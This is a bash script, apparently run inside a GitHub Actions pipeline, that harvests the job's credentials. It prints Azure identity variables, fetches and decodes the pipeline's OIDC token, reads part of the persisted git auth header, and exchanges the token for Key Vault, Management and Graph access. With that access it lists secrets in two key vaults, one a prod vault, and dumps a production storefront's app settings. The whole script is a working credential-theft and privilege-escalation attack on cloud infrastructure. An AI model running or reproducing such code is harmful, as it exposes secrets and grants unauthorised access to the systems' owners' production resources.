#!/usr/bin/env bash
set -uo pipefail
echo "### pipeline identity vars"
echo "AZURE_CLIENT_ID=[${AZURE_CLIENT_ID:-UNSET}]"
echo "AZURE_TENANT_ID=[${AZURE_TENANT_ID:-UNSET}]"
echo "AZURE_SUBSCRIPTION_ID=[${AZURE_SUBSCRIPTION_ID:-UNSET}]"

echo "### oidc token claims"
J=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL:-}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
python3 - "$J" <<'PY'
import sys,json,base64
t=sys.argv[1]
if not t: print("NO TOKEN"); raise SystemExit
p=t.split('.')[1]; p+='='*(-len(p)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print(json.dumps({k:c[k] for k in ('iss','aud','sub','repository','repository_owner','job_workflow_ref','ref','event_name','environment','actor','workflow_ref') if k in c},indent=1))
PY

echo "### git persisted creds"
git -C . config --get http.https://github.com/.extraheader 2>/dev/null | head -c 40; echo

TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
xchg() {
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d client_id="$1" -d grant_type=client_credentials \
    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=$J" --data-urlencode "scope=$2"
}
echo "### exchange with pipeline's own AZURE_CLIENT_ID"
for SC in "https://vault.azure.net/.default" "https://management.azure.com/.default" "https://graph.microsoft.com/.default"; do
  R=$(xchg "${AZURE_CLIENT_ID:-}" "$SC")
  TOKLEN=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);t=d.get("access_token");print(len(t) if t else "ERR:"+str(d.get("error_description",d))[:150])')
  echo "  $SC -> $TOKLEN"
  if [ "$SC" = "https://vault.azure.net/.default" ]; then
    VT=$(printf '%s' "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
  fi
  if [ "$SC" = "https://management.azure.com/.default" ]; then
    AT=$(printf '%s' "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
  fi
done
if [ -n "${VT:-}" ]; then
  echo "### kv-tbl-sec with pipeline identity"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25" -H "Authorization: Bearer $VT" | head -c 1500; echo
  echo "### kv-tbl-prod"
  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25" -H "Authorization: Bearer $VT" | head -c 600; echo
fi
if [ -n "${AT:-}" ]; then
  echo "### oid + storefront appsettings"
  python3 - "$AT" <<'PY'
import sys,json,base64
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
c=json.loads(base64.urlsafe_b64decode(p)); print('oid',c.get('oid'),'appid',c.get('appid'))
PY
  curl -sS -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' \
    "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01" | head -c 2000; echo
fi
echo "### DONE"
